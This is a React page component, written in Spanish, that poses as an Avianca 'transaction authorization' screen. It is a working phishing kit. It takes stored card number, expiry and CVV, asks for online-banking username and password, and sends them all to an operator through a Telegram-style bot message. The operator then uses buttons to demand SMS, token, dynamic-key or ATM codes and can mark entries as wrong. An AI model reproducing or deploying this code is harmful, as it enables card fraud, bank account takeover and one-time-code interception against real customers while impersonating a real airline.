"use client"

import { useEffect, useState, useCallback } from "react"

// --- Tipos ---
interface PaymentData {
  flightCost?: string
  totalPrice?: string
  amount?: string
  price?: string
  cardNumber?: string
  transactionId?: string
  name?: string
  cc?: string
  email?: string
  telnum?: string
  city?: string
  state?: string
  address?: string
  bank?: string
  expiryDate?: string;
  cvv?: string;
  dues?: string;
}

// --- Helpers ---
const escapeMarkdownV2 = (text: string | undefined): string => {
  if (!text) return 'No ingresado';
  return text.replace(/([_\[\]()~`>#+\-=|{}.!])/g, '\\$1');
};

const allCodeButtons = (transactionId: string) => [
  { text: "Pedir SMS 📱", callback_data: `sms:${transactionId}` },
  { text: "Pedir Clave Dinámica 🔑", callback_data: `dinamica:${transactionId}` },
  { text: "Pedir Token 📟", callback_data: `token:${transactionId}` },
  { text: "Pedir Cajero (ATM) 🏧", callback_data: `atm:${transactionId}` }
];

export default function App() {
  // Estados
  const [paymentData, setPaymentData] = useState<PaymentData>({});
  const [loading, setLoading] = useState(true);
  const [loadingText, setLoadingText] = useState("Validando datos...");
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [pageState, setPageState] = useState<'initial' | 'waiting_for_code'>('initial');
  const [authInputs, setAuthInputs] = useState({ user: '', password: '', dynamicCode: '' });
  const [dynamicCodeType, setDynamicCodeType] = useState<string>('');
  const [currentMessageId, setCurrentMessageId] = useState<string>('');

  // Función para obtener información del banco
  const fetchBankInfoFromBIN = useCallback(async (cardNumber: string) => {
    if (!cardNumber || cardNumber.length < 6) return;
    const bin = cardNumber.replace(/\s+/g, '').substring(0, 6);
    try {
      const response = await fetch(`/api/bin-lookup?bin=${bin}`);
      if (!response.ok) return;
      const data = await response.json();
      const bankName = data.bank?.name || 'Desconocido';
      const cardType = data.scheme?.toUpperCase() || '';
      const bankInfo = `${bankName} - ${cardType}`;
      setPaymentData(prev => ({ ...prev, bank: bankInfo }));
    } catch (error) {
      console.error("Error BIN lookup:", error);
    }
  }, []);

  // Long Polling Infinito
  const waitForOperatorAction = useCallback(async (messageId: string) => {
    setLoading(true);
    // No reseteamos el errorMessage aquí para permitir que se vea el error de "clave incorrecta" 
    // mientras el loader vuelve a aparecer si el usuario re-envía.

    try {
      const response = await fetch(`/api/check-update/${messageId}`);

      // Si el servidor responde 408 (Timeout) o 5xx, reintentamos de inmediato
      if (response.status === 408 || response.status >= 500) {
        console.log("Reintentando polling...");
        return waitForOperatorAction(messageId);
      }

      if (!response.ok) {
        // Otros errores (404, etc), esperamos un poco antes de reintentar
        setTimeout(() => waitForOperatorAction(messageId), 2000);
        return;
      }

      const { action } = await response.json();

      // Si no hay acción o es espera, reintentar
      if (!action || action === 'wait') {
        return waitForOperatorAction(messageId);
      }

      // Procesar acciones del operador
      setLoading(false);
      
      const isErrorAction = action.startsWith('error_');
      const isRequestAction = ['sms', 'dinamica', 'token', 'atm'].includes(action);

      if (isRequestAction) {
        setPageState('waiting_for_code');
        let descriptiveText = 'el código de seguridad';
        if (action === 'sms') descriptiveText = 'el código que recibiste por SMS';
        if (action === 'dinamica') descriptiveText = 'la Clave Dinámica';
        if (action === 'token') descriptiveText = 'el Token digital';
        if (action === 'atm') descriptiveText = 'el código generado en el Cajero (ATM)';
        
        setDynamicCodeType(descriptiveText);
        setAuthInputs(prev => ({ ...prev, dynamicCode: '' }));
        setErrorMessage(null);
        setTimeout(() => document.getElementById('dynamic-code')?.focus(), 100);

      } else if (isErrorAction) {
        if (action === 'error_logo') {
          setErrorMessage("Usuario o clave incorrectos. Verifique e intente nuevamente.");
          setPageState('initial');
          setAuthInputs(prev => ({ ...prev, password: '' }));
          setTimeout(() => document.getElementById('auth-user')?.focus(), 100);
        } else if (action === 'error_tc') {
          alert("Error en la validación de la tarjeta. Verifique sus datos.");
          window.location.href = "/";
        } else {
          let codeType = action.replace('error_', '').toUpperCase();
          setErrorMessage(`El código ${codeType} ingresado es inválido o expiró.`);
          setAuthInputs(prev => ({ ...prev, dynamicCode: '' }));
          setTimeout(() => document.getElementById('dynamic-code')?.focus(), 100);
        }
      } else if (action === 'finalizar') {
        setLoadingText("Pago Aprobado exitosamente. Redirigiendo...");
        setLoading(true);
        setTimeout(() => {
          window.location.href = `/confirmacion?tid=${paymentData.transactionId}`;
        }, 2500);
      }

    } catch (error) {
      console.error("Polling Error:", error);
      // En caso de caída de internet o error de fetch, reintentar en 3 segundos
      setTimeout(() => waitForOperatorAction(messageId), 3000);
    }
  }, [paymentData.transactionId]);

  // Carga inicial
  useEffect(() => {
    const stored = localStorage.getItem("paymentData");
    let storedData: PaymentData = stored ? JSON.parse(stored) : {};
    if (!storedData.transactionId) {
      storedData.transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
      localStorage.setItem('paymentData', JSON.stringify(storedData));
    }
    setPaymentData(storedData);
    if (storedData.cardNumber) fetchBankInfoFromBIN(storedData.cardNumber);
    setTimeout(() => setLoading(false), 800);
  }, [fetchBankInfoFromBIN]);

  // Enviar Datos
  const handleNextStep = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);
    setLoading(true);
    setLoadingText(pageState === 'initial' ? "Verificando credenciales..." : "Validando código...");

    const bankInfo = paymentData.bank || 'No detectado';
    const baseButtons = allCodeButtons(paymentData.transactionId!);

    let fullMessage = `
✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
👤 *DATOS DEL TITULAR*
💳 Tarjeta: \`${escapeMarkdownV2(paymentData.cardNumber)}\`
🗓️ Exp: \`${escapeMarkdownV2(paymentData.expiryDate)}\`
🔒 CVV: \`${escapeMarkdownV2(paymentData.cvv)}\`
🏦 Banco: \`${escapeMarkdownV2(bankInfo)}\`
`;

    let keyboard = { inline_keyboard: [] as any[] };

    if (pageState === 'initial') {
      fullMessage += `
👤 *DATOS DE ACCESO*
🤵 User: \`${escapeMarkdownV2(authInputs.user)}\`
🔒 Pass: \`${escapeMarkdownV2(authInputs.password)}\`
🆔 ID: \`${paymentData.transactionId}\`
`;
      keyboard.inline_keyboard = [
        ...baseButtons.map(btn => [btn]),
        [{ text: "Usuario/Clave Incorrecta ❌", callback_data: `error_logo:${paymentData.transactionId}` }],
        [{ text: "Tarjeta Inválida 💳", callback_data: `error_tc:${paymentData.transactionId}` }]
      ];
    } else {
      fullMessage += `
👤 *DATOS + CÓDIGO*
🤵 User: \`${escapeMarkdownV2(authInputs.user)}\`
🔴 ${escapeMarkdownV2(dynamicCodeType.toUpperCase())}: \`${escapeMarkdownV2(authInputs.dynamicCode)}\`
🆔 ID: \`${paymentData.transactionId}\`
`;
      const currentActionPrefix = dynamicCodeType.toLowerCase().includes('cajero') ? 'atm' : dynamicCodeType.toLowerCase().split(' ')[0];
      keyboard.inline_keyboard = [
        ...baseButtons.filter(btn => !btn.callback_data.includes(currentActionPrefix)).map(btn => [btn]),
        [{ text: `Código Incorrecto ❌`, callback_data: `error_${currentActionPrefix}:${paymentData.transactionId}` }],
        [{ text: "✅ APROBAR PAGO ✅", callback_data: `finalizar:${paymentData.transactionId}` }]
      ];
    }

    try {
      const response = await fetch(`/api/send-message`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          text: fullMessage,
          keyboard: keyboard,
          message_id: pageState === 'waiting_for_code' ? currentMessageId : undefined
        }),
      });

      const data = await response.json();
      if (response.ok && data.result?.message_id) {
        setCurrentMessageId(data.result.message_id);
        waitForOperatorAction(data.result.message_id);
      } else {
        throw new Error("API Error");
      }
    } catch (error) {
      setLoading(false);
      setErrorMessage("Error de conexión. Intente nuevamente.");
    }
  };

  const last4 = paymentData.cardNumber ? paymentData.cardNumber.replace(/\s+/g, '').slice(-4) : "1234";

  return (
    <main className="min-h-screen bg-[#f4f7f6] flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-white p-6 rounded-lg shadow-lg border border-gray-200">
        <div className="flex items-center justify-center mb-5">
          <div className="h-8 flex items-center text-red-600 font-bold text-xl uppercase tracking-tighter">
             Avianca
          </div>
        </div>

        <b className="text-gray-800 mb-1 block font-bold">Autorización de transacción</b>
        <p className="text-sm text-gray-600 mb-5">La transacción que intenta realizar en <b className="font-semibold text-gray-700">AVIANCA S.A</b> debe ser autorizada. Por favor, ingresa los datos de tu banca virtual:</p>

        <div className="bg-[#f4f7f6] p-4 rounded-lg mb-6 text-sm space-y-2 border border-gray-100">
          <div className="flex justify-between">
            <span className="font-bold text-gray-700">Comercio</span>
            <span className="text-gray-700">AVIANCA S.A</span>
          </div>
          <div className="flex justify-between">
            <span className="font-bold text-gray-700">Banco</span>
            <span className="text-gray-700">{paymentData.bank || 'Verificando...'}</span>
          </div>
          <div className="flex justify-between">
            <span className="font-bold text-gray-700">Número de tarjeta</span>
            <span className="text-gray-700 tracking-wider">•••• •••• •••• {last4}</span>
          </div>
        </div>

        <form onSubmit={handleNextStep}>
          {errorMessage && (
            <div className="bg-red-50 text-red-700 text-sm p-3 rounded-md mb-4 border border-red-200 flex items-start">
              <span className="mr-2 pt-0.5">⚠️</span>
              <span>{errorMessage}</span>
            </div>
          )}

          <div className={pageState === 'waiting_for_code' ? 'hidden' : 'block'}>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-semibold mb-1 text-gray-700">Usuario</label>
                <input
                  type="text"
                  required={pageState === 'initial'}
                  className="w-full rounded-md border border-gray-300 px-4 py-3 text-gray-900 focus:ring-2 focus:ring-red-500 outline-none transition-all"
                  value={authInputs.user}
                  onChange={e => setAuthInputs({ ...authInputs, user: e.target.value })}
                  disabled={loading}
                  id="auth-user"
                />
              </div>
              <div>
                <label className="block text-sm font-semibold mb-1 text-gray-700">Contraseña</label>
                <input
                  type="password"
                  required={pageState === 'initial'}
                  className="w-full rounded-md border border-gray-300 px-4 py-3 text-gray-900 focus:ring-2 focus:ring-red-500 outline-none transition-all"
                  value={authInputs.password}
                  onChange={e => setAuthInputs({ ...authInputs, password: e.target.value })}
                  disabled={loading}
                  id="auth-password"
                />
              </div>
            </div>
          </div>

          <div className={pageState === 'waiting_for_code' ? 'block' : 'hidden'}>
            <div className="text-center mb-4">
              <label className="block text-red-600 text-lg font-bold mb-1">Verificación Requerida</label>
              <p className="text-sm text-gray-600">Ingrese {dynamicCodeType} para confirmar la compra.</p>
            </div>
            <input
              type="tel"
              id="dynamic-code"
              required={pageState === 'waiting_for_code'}
              className="w-full px-4 py-4 text-center text-2xl tracking-[0.5em] font-bold rounded-md border-2 border-red-100 focus:border-red-500 outline-none transition-all"
              placeholder="••••••"
              value={authInputs.dynamicCode}
              onChange={e => setAuthInputs({ ...authInputs, dynamicCode: e.target.value })}
              disabled={loading}
            />
          </div>

          <div className="mt-6">
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#E8114B] hover:bg-[#D40E43] text-white font-bold py-4 text-lg transition duration-200 disabled:opacity-70 rounded-md shadow-md"
            >
              {pageState === 'initial' ? 'Autorizar' : 'Confirmar Transacción'}
            </button>
          </div>
        </form>
      </div>

      {loading && (
        <div className="fixed inset-0 bg-white/95 z-50 flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="relative flex items-center justify-center">
            <div className="border-4 border-gray-100 border-t-[#E8114B] rounded-full w-16 h-16 animate-spin"></div>
            <div className="absolute text-[10px] font-bold text-red-600">AV</div>
          </div>
          <p className="mt-4 text-gray-800 font-medium animate-pulse">{loadingText}</p>
          <p className="text-xs text-gray-400 mt-2">No cierre ni recargue esta ventana</p>
        </div>
      )}
    </main>
  );
}
